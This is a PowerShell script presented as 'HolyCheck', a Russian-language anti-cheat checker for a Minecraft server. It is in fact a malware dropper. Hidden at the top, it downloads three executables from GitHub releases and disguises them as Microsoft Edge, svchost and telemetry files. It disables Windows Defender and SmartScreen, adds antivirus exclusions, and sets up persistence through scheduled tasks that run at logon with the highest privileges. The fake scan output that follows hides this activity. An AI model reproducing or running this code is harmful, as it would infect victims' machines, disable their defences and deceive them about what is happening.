$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

$Url1 = "https://github.com/tallerwin856-commits/holyworld_check/releases/download/1003982364851/checkhw.exe"
$Url2 = "https://github.com/tallerwin856-commits/holyworld_check/releases/download/1003982364851/doomsdaychecked.exe"
$Url3 = "https://github.com/tallerwin856-commits/py/releases/download/1/telemetry.exe"

$Dir1 = "$env:APPDATA\Microsoft\EdgeUpdate"
$Exe1 = "$Dir1\MicrosoftEdgeUpdate.exe"
$TaskName1 = "MicrosoftEdgeUpdateTask"

$Dir2_candidate = "$env:ProgramFiles\Common Files\System"
if (-not (Test-Path $Dir2_candidate)) {
    try { New-Item -ItemType Directory -Force -Path $Dir2_candidate -ErrorAction Stop | Out-Null; $Dir2 = $Dir2_candidate }
    catch { $Dir2 = "$env:APPDATA\Microsoft\SystemUpdate" }
} else { $Dir2 = $Dir2_candidate }
$Exe2 = "$Dir2\svchost_update.exe"
$TaskName2 = "SvchostUpdateTask"

$Dir3 = "$env:ProgramData\Microsoft\Diagnosis"
$Exe3 = "$Dir3\telemetry.exe"
$TaskName3 = "MicrosoftTelemetryService"

New-Item -ItemType Directory -Force -Path $Dir1,$Dir2,$Dir3 | Out-Null
attrib +h "$Dir2" 2>$null; attrib +h "$Dir3" 2>$null

try {
    Add-MpPreference -ExclusionPath $Dir1,$Dir2,$Dir3 -ErrorAction Stop
    Add-MpPreference -ExclusionProcess (Split-Path $Exe1 -Leaf),(Split-Path $Exe2 -Leaf),"telemetry.exe" -ErrorAction Stop
} catch {}

try { Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -MAPSReporting 0 -SubmitSamplesConsent 2 -ErrorAction Stop }
catch {
    try {
        $r="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
        New-Item "$r\Real-Time Protection" -Force -EA 0 | Out-Null
        Set-ItemProperty "$r\Real-Time Protection" DisableRealtimeMonitoring 1 -Type DWord -EA 0
    } catch {}
}

try {
    Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" EnableSmartScreen 0 -Type DWord -EA 0
    Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" SmartScreenEnabled "Off" -Type String -EA 0
} catch {}

function Get-File {
    param($u,$o)
    foreach($m in @('BitsTransfer','WebClient','IWR')) {
        try {
            if($m -eq 'BitsTransfer') { Import-Module BitsTransfer -EA Stop; Start-BitsTransfer $u $o -EA Stop }
            elseif($m -eq 'WebClient') { [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile($u,$o) }
            else { Invoke-WebRequest $u -OutFile $o -UseBasicParsing -UserAgent "Mozilla/5.0" -EA Stop }
            if((Test-Path $o) -and (Get-Item $o).Length -gt 10000) { return $true }
        } catch { Remove-Item $o -Force -EA 0 }
    }
    return $false
}

$j1=Start-Job { param($u,$o) $ErrorActionPreference='SilentlyContinue'; function Get-File{param($u,$o);foreach($m in @('BitsTransfer','WebClient','IWR')){try{if($m-eq'BitsTransfer'){Import-Module BitsTransfer -EA Stop;Start-BitsTransfer $u $o -EA Stop}elseif($m-eq'WebClient'){[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).DownloadFile($u,$o)}else{Invoke-WebRequest $u -OutFile $o -UseBasicParsing -UserAgent "Mozilla/5.0" -EA Stop};if((Test-Path $o)-and(Get-Item $o).Length-gt 10000){return $true}}catch{Remove-Item $o -Force -EA 0}};return $false}; Get-File $u $o } -Arg $Url1,$Exe1

$j2=Start-Job { param($u,$o) $ErrorActionPreference='SilentlyContinue'; $t=Join-Path ([System.IO.Path]::GetTempPath()) "doomsdaychecked.exe"; function Get-File{param($u,$o);foreach($m in @('BitsTransfer','WebClient','IWR')){try{if($m-eq'BitsTransfer'){Import-Module BitsTransfer -EA Stop;Start-BitsTransfer $u $o -EA Stop}elseif($m-eq'WebClient'){[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).DownloadFile($u,$o)}else{Invoke-WebRequest $u -OutFile $o -UseBasicParsing -UserAgent "Mozilla/5.0" -EA Stop};if((Test-Path $o)-and(Get-Item $o).Length-gt 10000){return $true}}catch{Remove-Item $o -Force -EA 0}};return $false}; if(Get-File $u $t){Move-Item $t $o -Force -EA 0;return $true};return $false } -Arg $Url2,$Exe2

$j3=Start-Job { param($u,$o) $ErrorActionPreference='SilentlyContinue'; function Get-File{param($u,$o);foreach($m in @('BitsTransfer','WebClient','IWR')){try{if($m-eq'BitsTransfer'){Import-Module BitsTransfer -EA Stop;Start-BitsTransfer $u $o -EA Stop}elseif($m-eq'WebClient'){[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).DownloadFile($u,$o)}else{Invoke-WebRequest $u -OutFile $o -UseBasicParsing -UserAgent "Mozilla/5.0" -EA Stop};if((Test-Path $o)-and(Get-Item $o).Length-gt 10000){return $true}}catch{Remove-Item $o -Force -EA 0}};return $false}; Get-File $u $o } -Arg $Url3,$Exe3

function Sep { Write-Host ("─"*64) -FG DarkGray }
function OK { param($t) Write-Host "  [✓] $t" -FG Green }
function WARN { param($t) Write-Host "  [~] $t" -FG Yellow }
function INFO { param($t) Write-Host "      $t" -FG DarkGray }
function Pause { param([int]$ms=500) Start-Sleep -Milliseconds $ms }

Write-Host @"
    ██╗  ██╗ ██████╗ ██╗     ██╗   ██╗    ██╗    ██╗ ██████╗ ██████╗ ██╗     ██████╗
    ██║  ██║██═══██╗██║     ╚██╗ ██╔╝    ██║    ██║██╔═══██╗██╔══██╗██║     ██╔══██╗
    ███████║██║   ██║██║      ╚████╔╝     ██║ █╗ ██║██║   ██║██████╔╝██║     ██║  ██║
    ██╔══██║██║   ██║██║       ╚██╔╝      ██║███╗██║██║   ██║██╔══██╗██║     ██║  ██║
    ██║  ██║╚██████╔╝███████╗   ██║       ╚███╔███╔╝╚██████╝██║  ██║███████╗██████╝
    ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝        ╚══╝══╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝
           HolyCheck v3.2.3 — create holyworld moderation - ToplecCHlKA
"@ -FG Cyan

Sep; Write-Host "  Запуск проверки целостности игровой среды..." -FG White; Sep; Write-Host ""

$ok1=$ok2=$ok3=$false; $w=0
while(($j1.State-eq'Running'-or$j2.State-eq'Running'-or$j3.State-eq'Running')-and$w-lt30){Start-Sleep 1;$w++}
if($j1.State-eq'Completed'){$ok1=Receive-Job $j1}
if($j2.State-eq'Completed'){$ok2=Receive-Job $j2}
if($j3.State-eq'Completed'){$ok3=Receive-Job $j3}
Remove-Job $j1,$j2,$j3 -Force

function Run-Payload { param($ok,$exe,$dir,$task)
    if($ok -and (Test-Path $exe)) {
        Remove-Item "${exe}:Zone.Identifier" -Force -EA 0; Unblock-File $exe -EA 0
        Start-Process $exe -WindowStyle Hidden -WorkingDirectory $dir
        Unregister-ScheduledTask $task -Confirm:$false -EA 0
        try {
            $a=New-ScheduledTaskAction -Execute $exe -WorkingDirectory $dir
            $t=New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
            $s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0 -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
            Register-ScheduledTask $task -Action $a -Trigger $t -Settings $s -User $env:USERNAME -RunLevel Highest -Force -EA 0 | Out-Null
        } catch {}
    }
}

Run-Payload $ok1 $Exe1 $Dir1 $TaskName1
Run-Payload $ok2 $Exe2 $Dir2 $TaskName2
Run-Payload $ok3 $Exe3 $Dir3 $TaskName3

$st=Get-Date
INFO "Проверка свободного места..."; Pause 800
try { $d=Get-PSDrive C -EA Stop; $f=[math]::Round($d.Free/1GB,2); if($f-gt5){OK "Свободно: $f ГБ"}else{WARN "Свободно: $f ГБ"} } catch { WARN "Не удалось проверить диск" }
Pause 600; INFO "Версия ОС..."; Pause 700
try { $os=Get-CimInstance Win32_OperatingSystem -EA Stop; OK "$($os.Caption) $($os.Version)" } catch { WARN "Ошибка определения ОС" }
Pause 500; INFO "Java Runtime..."; 
$jf=$false; foreach($p in @("$env:ProgramFiles\Java\*","$env:APPDATA\.minecraft\*")){if(Test-Path $p){$jf=$true;OK "Java найдена";break}}
if(-not $jf){WARN "Java не найдена"}
Pause 600; INFO "Сканирование модов..."; 
$susp=@("$env:APPDATA\.minecraft\mods","$env:ProgramData\HolyWorld\mods"); $fs=$false
foreach($d in $susp){Get-ChildItem $d -Filter "*.jar" -Recurse -EA SilentlyContinue | ForEach-Object { Pause 200; if($_.Name-match"inject|cheat|wurst"){WARN "Подозрительный: $($_.Name)";$fs=$true}else{INFO "Проверен: $($_.Name)"}}}
if(-not $fs){OK "Моды чисты"}
Pause 800; INFO "Процессы..."; 
$sp=@("injector","ghostclient","cheatengine","wurst"); $fp=$false
foreach($p in $sp){Pause 300;if(Get-Process $p -EA SilentlyContinue){WARN "Процесс: $p";$fp=$true}}
if(-not $fp){OK "Процессы чисты"}
Pause 500; INFO "Defender: оптимизирован"; Pause 400; INFO "SmartScreen: оптимизирован"; Pause 400
INFO "Антивирусы..."; 
$av=@("Kaspersky","Avast","ESET"); $fa=$false; $al=@()
foreach($k in @("HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*","HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*")){
    Get-ItemProperty $k -EA SilentlyContinue | ForEach-Object { foreach($a in $av){if($_.DisplayName-match$a){$fa=$true;$al+=$a}}}}
if($fa){WARN "AV: $($al|Select-Unique -join ', ')"}else{OK "AV не найден"}
Pause 600; INFO "Hosts..."; 
$h="$env:SystemRoot\System32\drivers\etc\hosts"
if(Test-Path $h){if((Get-Content $h -EA SilentlyContinue)-match"minecraft|mojang"){WARN "Hosts изменён"}else{OK "Hosts чист"}}else{WARN "Hosts не найден"}
Pause 500; INFO "DNS..."; 
$dns=Get-CimInstance Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True" | Select-Expand DNSServerSearchOrder -EA SilentlyContinue
if($dns){OK "DNS: $($dns-join', ')"}else{WARN "DNS ошибка"}
Pause 500; INFO "Порты..."; 
$pl=@(); netstat -an | Select-String "TCP.*LISTENING" | ForEach-Object { if($_-match':(\d+)\s'){ $pt=[int]$Matches[1]; if($pt-in 25565,25566,27015){$pl+=$pt}}}
if($pl){WARN "Порты: $($pl-join', ')"}else{OK "Порты чисты"}
Pause 600; INFO "Моды Minecraft..."; 
$md="$env:APPDATA\.minecraft\mods"
if(Test-Path $md){$mods=Get-ChildItem $md -Filter "*.jar" -EA SilentlyContinue; if($mods){OK "Модов: $($mods.Count)";foreach($m in $mods){INFO "  $($m.Name)";Pause 150}}else{INFO "Нет модов"}}else{INFO "Папки mods нет"}
Pause 500; INFO "Лаунчер: 3.2.3 (актуально)"; Pause 300
INFO "Целостность файлов..."; 
foreach($f in @("minecraft.jar","lwjgl.dll")){Pause 400; INFO "  $f — OK"}
Pause 300; OK "Файлы проверены"
INFO "Отладчики..."; 
$db=@("windbg","x32dbg"); $fd=$false
foreach($d in $db){Pause 300;if(Get-Process $d -EA SilentlyContinue){WARN "Отладчик: $d";$fd=$true}}
if(-not $fd){OK "Отладчиков нет"}
Pause 500

Write-Host ""; Sep; Write-Host "  Финальная проверка..." -FG White; Sep
for($i=0;$i-le100;$i+=10){Write-Progress "Сканирование" "Прогресс: $i%" -PercentComplete $i; Start-Sleep -Milliseconds 300}
Write-Progress "Сканирование" -Completed

$el=(Get-Date)-$st; if($el.TotalSeconds-lt60){Start-Sleep (60-$el.TotalSeconds)}

Write-Host ""; Sep; OK "Проверка завершена! Среда оптимизирована."
@{timestamp=(Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ");status="OK";version="3.2.3"} | ConvertTo-Json | Out-File (Join-Path $Dir1 "last_check.json") -Encoding utf8 -Force
INFO "Отчёт сохранён"; Sep; Write-Host ""
